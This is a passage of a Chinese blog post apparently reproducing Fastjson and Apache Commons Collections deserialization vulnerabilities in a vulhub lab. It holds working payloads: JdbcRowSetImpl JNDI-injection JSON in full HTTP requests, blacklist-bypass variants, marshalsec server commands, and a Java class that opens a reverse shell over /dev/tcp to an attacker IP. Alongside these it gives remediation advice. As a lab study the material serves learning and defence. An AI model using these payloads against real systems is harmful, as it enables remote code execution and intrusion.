class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JSON.parseObject() 返回实际类型对象,显示指定对象</span><br><span class=\"line\">User user1 = JSON.parseObject(serializedStr, User.class);</span><br><span class=\"line\">JSON.parse() 返回JsonObject对象，需要强制类型转换</span><br><span class=\"line\">Object obj1 =JSON.parse(serializedStr);</span><br></pre></td></tr></table></figure>\n<p>测试代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">JsonTest</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 从1.2.25开始，autotype默认关闭</span></span><br><span class=\"line\">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 序列化字符</span></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">serializedStr</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.wuya.test.User\\&quot;,\\&quot;name\\&quot;:\\&quot;wuya\\&quot;,\\&quot;age\\&quot;:66, \\&quot;flag\\&quot;: true,\\&quot;sex\\&quot;:\\&quot;boy\\&quot;,\\&quot;address\\&quot;:\\&quot;china\\&quot;&#125;&quot;</span>;<span class=\"comment\">//</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;serializedStr=&quot;</span> + serializedStr);</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;-----------------------------------------------\\n\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//通过parse方法进行反序列化，返回的是一个JSONObject]</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;JSON.parse(serializedStr)：&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj1</span> <span class=\"operator\">=</span>JSON.parse(serializedStr);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parse反序列化对象名称:&quot;</span> + obj1.getClass().getName());</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parse反序列化：&quot;</span> + obj1);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;-----------------------------------------------\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 通过parseObject,不指定类，返回的是一个JSONObject</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;JSON.parseObject(serializedStr)：&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj2</span> <span class=\"operator\">=</span> JSON.parseObject(serializedStr);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parseObject反序列化对象名称:&quot;</span> + obj2.getClass().getName());</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parseObject反序列化:&quot;</span> + obj2);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;-----------------------------------------------\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 通过parseObject,指定为object.class</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;JSON.parseObject(serializedStr, Object.class)：&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj3</span> <span class=\"operator\">=</span> JSON.parseObject(serializedStr, Object.class);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parseObject反序列化对象名称:&quot;</span> + obj3.getClass().getName());</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parseObject反序列化:&quot;</span> + obj3);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;-----------------------------------------------\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 通过parseObject,指定为User.class</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;JSON.parseObject(serializedStr, User.class)：&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj4</span> <span class=\"operator\">=</span> JSON.parseObject(serializedStr, User.class);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parseObject反序列化对象名称:&quot;</span> + obj4.getClass().getName());</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parseObject反序列化:&quot;</span> + obj4);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;-----------------------------------------------\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">JSON.parse(serializedStr)：</span><br><span class=\"line\">call User default Constructor</span><br><span class=\"line\">call User setName</span><br><span class=\"line\">call User setAge</span><br><span class=\"line\">call User setFlag</span><br><span class=\"line\">parse反序列化对象名称:com.wuya.test.User</span><br><span class=\"line\">parse反序列化：User&#123;name=&#x27;wuya&#x27;, age=66, flag=true, sex=&#x27;boy&#x27;, address=&#x27;null&#x27;&#125;</span><br><span class=\"line\">-----------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\">JSON.parseObject(serializedStr)：</span><br><span class=\"line\">call User default Constructor</span><br><span class=\"line\">call User setName</span><br><span class=\"line\">call User setAge</span><br><span class=\"line\">call User setFlag</span><br><span class=\"line\">call User getAge</span><br><span class=\"line\">call User isFlag</span><br><span class=\"line\">call User getName</span><br><span class=\"line\">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class=\"line\">parseObject反序列化:&#123;&quot;flag&quot;:true,&quot;sex&quot;:&quot;boy&quot;,&quot;name&quot;:&quot;wuya&quot;,&quot;age&quot;:66&#125;</span><br><span class=\"line\">-----------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\">JSON.parseObject(serializedStr, Object.class)：</span><br><span class=\"line\">call User default Constructor</span><br><span class=\"line\">call User setName</span><br><span class=\"line\">call User setAge</span><br><span class=\"line\">call User setFlag</span><br><span class=\"line\">parseObject反序列化对象名称:com.wuya.test.User</span><br><span class=\"line\">parseObject反序列化:User&#123;name=&#x27;wuya&#x27;, age=66, flag=true, sex=&#x27;boy&#x27;, address=&#x27;null&#x27;&#125;</span><br><span class=\"line\">-----------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\">JSON.parseObject(serializedStr, User.class)：</span><br><span class=\"line\">call User default Constructor</span><br><span class=\"line\">call User setName</span><br><span class=\"line\">call User setAge</span><br><span class=\"line\">call User setFlag</span><br><span class=\"line\">parseObject反序列化对象名称:com.wuya.test.User</span><br><span class=\"line\">parseObject反序列化:User&#123;name=&#x27;wuya&#x27;, age=66, flag=true, sex=&#x27;boy&#x27;, address=&#x27;null&#x27;&#125;</span><br><span class=\"line\">-----------------------------------------------</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>@ type 自省</p>\n<p>我们可以发现，在反序列化是没有类名的，可以通过自省传入类名。</p>\n<p>但不包含类名的问题是，当子类中包含接口或抽象类的时候，类型丢失</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;name=&#x27;wuya&#x27;, age=66, flag=true, sex=&#x27;boy&#x27;, address=&#x27;null&#x27;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;@type&quot;:&quot;com.wuya.test.User&quot;,&quot;age&quot;:33,&quot;flag&quot;:false,&quot;name&quot;:&quot;wuya&quot;&#125;</span><br></pre></td></tr></table></figure>\n<p>利用自省功能传入恶意类实现攻击</p>\n<p>这个 JSON 反序列化接口处，我们传入恶意的 JSON，就可以调用任意类的构造方法以及属性相关的 get，set 方法。 如果某类的相关方法里有危险的代码（如执行某个命令），我们就可以构造恶意 JSON 达到 RCE 的作用。</p>\n<p>利用类</p>\n<p>com.sun.rowset.JdbcRowSetImpl</p>\n<p>dataSourceName 支持传入一个 rmi 的源，可以实现 JNDI 注入攻击</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122144731132.png\" alt=\"image-20221122144731132\"></p>\n<h4 id=\"1214-cnvd-2017-02833\"><a class=\"markdownIt-Anchor\" href=\"#1214-cnvd-2017-02833\">#</a> 1.2.14 CNVD-2017-02833</h4>\n<p>复现</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、vulhub启动靶场</span><br><span class=\"line\">2、Kali 用marshalsec启动LDAP/RMI服务</span><br><span class=\"line\">3、Kali 用python启动HTTP服务，存放恶意类</span><br><span class=\"line\">4、Kali 用netcat监听端口，建立反弹连接</span><br></pre></td></tr></table></figure>\n<p>切换 python 版本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">配置</span><br><span class=\"line\">update-alternatives --install /usr/bin/python</span><br><span class=\"line\">python /usr/bin/python2 100</span><br><span class=\"line\">update-alternatives --install /usr/bin/python</span><br><span class=\"line\">python /usr/bin/python3 150</span><br><span class=\"line\">切换版本</span><br><span class=\"line\">update-alternatives --config python</span><br></pre></td></tr></table></figure>\n<p>配置 jre 版本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/profile</span><br><span class=\"line\">export</span><br><span class=\"line\">JAVA_HOME=/usr/local/soft/java/jdk1.8.0_74</span><br><span class=\"line\">export PATH=$JAVA_HOME/bin:$PATH</span><br><span class=\"line\">export</span><br><span class=\"line\">CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HO</span><br><span class=\"line\">ME/lib/tools.jar</span><br><span class=\"line\">source /etc/profile</span><br></pre></td></tr></table></figure>\n<p>攻击:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">编写恶意代码LinuxTouch，编译为class</span><br><span class=\"line\">python -m http.server 8089 #python3</span><br><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.142.132:8089/#LinuxTouch&quot; 9473</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST / HTTP/1.1</span><br><span class=\"line\">Host: 192.168.142.128:8090</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 146</span><br><span class=\"line\">&#123; &quot;b&quot;: &#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;rmi://192.168.142.132:9473/LinuxTouch&quot;, &quot;autoCommit&quot;: true</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>原理:</p>\n<p><strong>1.JdbcRowSetImpl</strong></p>\n<p>payload 中反序列化时传入了 dataSourceName 和 autoCommit</p>\n<p>那么按照上面的反序列化过程一定会调用 setDataSourceName 和 setautoCommit</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void setDataSourceName(String dsName) throws SQLException&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">       if(getDataSourceName() != null) &#123;</span><br><span class=\"line\">          if(!getDataSourceName().equals(dsName)) &#123;</span><br><span class=\"line\">             super.setDataSourceName(dsName);</span><br><span class=\"line\">             conn = null;</span><br><span class=\"line\">             ps = null;</span><br><span class=\"line\">             rs = null;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       else &#123;</span><br><span class=\"line\">          super.setDataSourceName(dsName);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n<p>setautoCommit</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122153207492.png\" alt=\"image-20221122153207492\"></p>\n<p>setautoCommit 调用 connect ()，connect () 会对 dataSourceName 属性进行一个 InitialContext.lookup (dataSourceName), 从而实现 JNDI 注入。找到恶意服务器上下载代码并执行</p>\n<p>修复</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">默认不使用autotype</span><br><span class=\"line\">com.sun.rowset.jdbcRowSetlmpl被加入了黑名单</span><br></pre></td></tr></table></figure>\n<p>bypass 1</p>\n<p>所以在 autotypesupport 开启时，我们可以构造如下 payload 来 bypass</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://ip:1099&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>\n<p>“至于为什么会有这种奇怪的处理，L 和；这一对字符其实是 JVM 字节码中用来表示类名的：”</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (className.<span class=\"title function_\">startsWith</span>(<span class=\"string\">&quot;L&quot;</span>) &amp;&amp; className.<span class=\"title function_\">endsWith</span>(<span class=\"string\">&quot;;&quot;</span>)) &#123;</span><br><span class=\"line\">    <span class=\"title class_\">String</span> newClassName = className.<span class=\"title function_\">substring</span>(<span class=\"number\">1</span>, className.<span class=\"title function_\">length</span>() - <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">loadClass</span>(newClassName, classLoader);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>bypass2</p>\n<p>双写</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,</span><br><span class=\"line\">    &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:2357/Command8&quot;,</span><br><span class=\"line\">    &quot;autoCommit&quot;:true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"1247-cnvd-2017-22238\"><a class=\"markdownIt-Anchor\" href=\"#1247-cnvd-2017-22238\">#</a> 1.2.47 CNVD-2017-22238</h4>\n<p>通过反弹连接的方式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvp 9001</span><br><span class=\"line\">编写恶意代码LinuxRevers，编译为class</span><br><span class=\"line\">python -m http.server 8089 #python3</span><br><span class=\"line\"></span><br><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.142.132:8089/#LinuxRevers&quot; 9473</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//LinuxRevers.java</span><br><span class=\"line\">public class LinuxRevers &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Runtime rt = Runtime.getRuntime();</span><br><span class=\"line\">            String[] commands = &#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/192.168.142.132/9001 0&gt;&amp;1&quot;&#125;;</span><br><span class=\"line\">            Process pc = rt.exec(commands);</span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST / HTTP/1.1</span><br><span class=\"line\">Host: 192.168.142.128:8090</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 268</span><br><span class=\"line\">&#123;&quot;a&quot;:&#123; &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,</span><br><span class=\"line\">&quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://192.168.142.132:9473/LinuxRevers&quot;, &quot;autoCommit&quot;:true</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在 1.2.47 版本及以下的情况下，loadClass 中默认 cache 为 true，首先使用 java.lang.Class 把获取到的类缓存到 mapping 中，然后直接从缓存中获取到了 com.sun.rowset.jdbcRowSetlmpl 这个类，即可绕过黑名单。</p>\n<p>漏洞挖掘</p>\n<blockquote>\n<p>1、找到发送 JSON 序列化数据的接口</p>\n<p>2、判断是否使用 fastjon</p>\n<p>1）非法格式报错</p>\n<p>{“x”:&quot;</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122154741767.png\" alt=\"image-20221122154741767\"></p>\n<p>2）使用 dnslog 探测</p>\n<p>{“x”:{&quot;@type&quot;:“java.net.Inet4Address” , “val”:“<span class=\"exturl\" data-url=\"aHR0cDovL3h4eC5kbnNsb2cuY24=\">xxx.dnslog.cn</span>”}}</p>\n<p>Burp 插件</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ppbG9uZzMwMzMvZmFzdGpzb25TY2Fu\">https://github.com/zilong3033/fastjsonScan</span></p>\n</blockquote>\n<p>修复</p>\n<blockquote>\n<p>1、升级 JDK</p>\n<p>6u211 / 7u201 / 8u191 /11.0.1</p>\n<p>2、升级 Fastjson 到最新版</p>\n<p>fastjson.parser.safeMode=true</p>\n<p>3、使用安全产品过滤非法内容</p>\n<p>4、更换其它序列化工具</p>\n<p>Jackson/Gson</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xOTU3MTg1\">浅析 FastJSON 反序列化漏洞（1.2.24——1.2.68） - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>\n<h3 id=\"apache-common-collections-反序列化漏洞\"><a class=\"markdownIt-Anchor\" href=\"#apache-common-collections-反序列化漏洞\">#</a> Apache Common Collections 反序列化漏洞</h3>\n<p>复现环境：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jdk 1.7.0_80</span><br><span class=\"line\">IDEA Project Structrure、Settings——Javacompile等设置成java7</span><br><span class=\"line\">Apache Commons Collections ≤ 3.2.1</span><br></pre></td></tr></table></figure>\n<p>Common Collections 提供了很多新的数据结构：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Bag interface for collections that have a number of copies of each object</span><br><span class=\"line\">BidiMap interface for maps that can be looked up from value to key as well and key to value</span><br><span class=\"line\">MapIterator interface to provide simple and quick iteration over maps</span><br><span class=\"line\">Transforming decorators that alter each object as it is added to the collection</span><br><span class=\"line\">Composite collections that make multiple collections look like one</span><br><span class=\"line\">Ordered maps and sets that retain the order elements are added in, includingan LRU based map</span><br><span class=\"line\">Reference map that allows keys and/or values to be garbage collected underclose control</span><br><span class=\"line\">Many comparator implementations</span><br><span class=\"line\">Many iterator implementations</span><br><span class=\"line\">Adapter classes from array and enumerations to collections</span><br><span class=\"line\">Utilities to test or create typical set-theory properties of collections such asunion, intersection, and closure</span><br></pre></td></tr></table></figure>\n<p>反射：</p>\n<p>class 文件以 CA FE BA BE 开头</p>\n<p>在程序运行的时候动态创建一个类的实例，调用实例的方法和访问它的属性</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static void test2()&#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            //初始化Runtime类</span><br><span class=\"line\">            Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class=\"line\">            // 调用Runtime类中的getRuntime方法得到Runtime类的对象</span><br><span class=\"line\">            Object rt = clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz);</span><br><span class=\"line\">            //再次使用invoke调用Runtime类中的方法时，传递我们获得的对象，这样就可以调用</span><br><span class=\"line\">            clazz.getMethod(&quot;exec&quot;,String.class).invoke(rt,&quot;calc&quot;);</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>详细的上面有详细解释，具体可以看上面</p>\n<h4 id=\"利用链1\"><a class=\"markdownIt-Anchor\" href=\"#利用链1\">#</a> 利用链 1</h4>\n<p>关键类：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">InvokeTransformer</span><br><span class=\"line\">利用Java反射机制来创建类实例</span><br><span class=\"line\"></span><br><span class=\"line\">ChainedTransformer</span><br><span class=\"line\">实现了Transformer链式调用，我们只需要传入一个Transformer数组ChainedTransformer就可以实现依次的去调用每一个Transformer的transform()方法</span><br><span class=\"line\"></span><br><span class=\"line\">ConstantTransformer</span><br><span class=\"line\">transform()返回构造函数的对象</span><br><span class=\"line\"></span><br><span 